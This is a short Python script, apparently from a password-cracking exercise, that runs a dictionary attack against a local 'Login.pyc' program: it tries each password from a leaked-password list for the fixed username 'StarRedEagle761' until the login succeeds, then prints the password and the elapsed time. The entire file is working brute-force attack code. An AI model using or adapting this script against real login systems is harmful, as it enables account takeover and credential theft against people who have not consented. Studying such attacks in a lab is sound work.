import time 
import subprocess

file = open("PwnedPWs100k", "r")
start = time.time()

fileUser = open("gang", "r")
username = "StarRedEagle761"
pw = [line.strip() for line in file]

for password in pw:
        check = subprocess.run(["python3", "Login.pyc", username, password], capture_output=True, text=True)

        if "Login successful." in check.stdout:
            print(f"Password found for {username}: {password}")
            break 
            

end = time.time()
tot  =  end - start
print(f"Time taken:{tot}")